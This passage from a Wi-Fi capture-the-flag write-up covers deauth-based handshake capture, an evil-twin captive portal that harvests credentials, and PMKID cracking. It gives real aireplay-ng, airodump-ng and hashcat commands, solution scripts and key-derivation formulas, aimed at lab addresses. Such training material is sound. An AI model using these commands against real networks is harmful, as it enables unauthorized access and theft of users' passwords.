The script implements `PBKDF2-HMAC-SHA1` PMK derivation, `PRF-512` PTK expansion, and MIC verification. It iterates the wordlist computing MICs until one matches the captured value.

---

## Challenge 2: Deauth Attack and Forced Handshake Capture

### Objective
Send 802.11 Deauthentication frames to disconnect a client from its AP, then capture the WPA2 handshake when it reconnects.

**Flag format**: `CTF{d34uth_4tt4ck_h4ndsh4k3_c4ptur3d}`

### Scenario
The `Corp-WiFi-CTF` AP is in scope. Force-disconnect a connected client with deauth frames and capture the 4-way handshake on reconnection. This lab uses Scapy simulation since physical hardware is not available.

### Hints
1. Deauth frames are Management frames (type=0, subtype=12).
2. Reason code 7 = "Class 3 frame from nonassociated STA".
3. Enable monitor mode: `airmon-ng start wlan0`.
4. `aireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> mon0` sends deauths.
5. `airodump-ng mon0 -w capture --bssid <AP_MAC>` captures the handshake.

### Solution

```bash
# Simulation (generates pcap, shows real commands)
python3 wifi_deauth.py --mode simulate \
  --ap-mac aa:bb:cc:11:22:33 --client-mac dd:ee:ff:44:55:66 --count 5

# Real capture (monitor mode interface required)
python3 wifi_deauth.py --mode capture --iface mon0 \
  --ap-mac aa:bb:cc:11:22:33 --timeout 30
```

The simulation builds `RadioTap / Dot11(type=0, subtype=12) / Dot11Deauth(reason=7)` frames for both directions (AP→Client and Client→AP spoofed), saves them to pcap, and prints the real-world `aireplay-ng` commands.

---

## Challenge 3: Evil Twin AP + Captive Portal Credential Harvesting

### Objective
Simulate an Evil Twin AP with a captive portal, capture credentials from simulated victims, and retrieve the flag.

**Flag format**: `CTF{3v1l_tw1n_cr3d3nt14l_h4rv3st}`

### Scenario
The captive portal at `10.70.10.20:80` mimics a "Free_WiFi_CTF" hotspot login page. When credentials are submitted, the `/admin/creds` endpoint reveals the flag. Submit at least one credential set to unlock it.

### Hints
1. Captive portals typically run on HTTP port 80.
2. Paths like `/hotspot-detect.html` and `/generate_204` trigger automatic browser pop-ups.
3. Submit a test credential to see the collection behavior.
4. Check `/admin/creds` for harvested credentials and the flag.
5. In real attacks, `hostapd-wpe` or `airbase-ng` creates the rogue AP.

### Solution

```bash
# Full simulation (3 victims)
python3 wifi_evil_twin.py --url http://10.70.10.20

# Single credential submission
python3 wifi_evil_twin.py --url http://10.70.10.20 \
  --email "user@example.com" --password "mypassword"

# Manual
curl -X POST http://10.70.10.20/login \
  -d "email=test@test.com&password=test123"
curl http://10.70.10.20/admin/creds
```

---

## Challenge 4: PMKID Attack — WPA2 Cracking Without a Client

### Objective
Retrieve a PMKID from the server, then use dictionary attack against the PMKID formula to recover the WPA2 password without capturing a full handshake.

**Flag format**: `CTF{pmk1d_at74ck_w1f1_p4ssw0rd_cr4ck3d}`

### Scenario
The server at `10.70.10.30:5000/pmkid` provides the PMKID, AP MAC, Client MAC, and SSID. Compute candidate PMKIDs from wordlist passwords and compare until a match is found, then submit the password to `/verify` for the flag.

### Hints
1. PMKID = `HMAC-SHA1(PMK, "PMK Name" + AP_MAC + Client_MAC)[:16]`
2. PMK = `PBKDF2(HMAC-SHA1, password, SSID, 4096, 32)`
3. Fetch parameters from `/pmkid`.
4. Iterate the wordlist, computing PMKID for each candidate.
5. Use `hcxtools` + `hashcat -m 22000` for GPU-accelerated real-world cracking.

### Solution

```bash
# Built-in wordlist
python3 wifi_pmkid.py --url http://10.70.10.30:5000

# With rockyou
python3 wifi_pmkid.py --url http://10.70.10.30:5000 \
  --wordlist /usr/share/wordlists/rockyou.txt
```

**Key formula:**
```python
pmk    = PBKDF2(HMAC-SHA1, password, SSID, 4096, 32)
pmkid  = HMAC-SHA1(pmk, b"PMK Name" + ap_mac + client_mac)[:16]
# If pmkid matches the captured value → password found
```

The script fetches the challenge parameters, iterates `COMMON_PASSWORDS` (plus optional wordlist), computes PMKIDs in pure Python, and on match submits the password to `/verify` to receive the flag. It also prints the `hashcat -m 22000` formatted hash line for GPU acceleration.
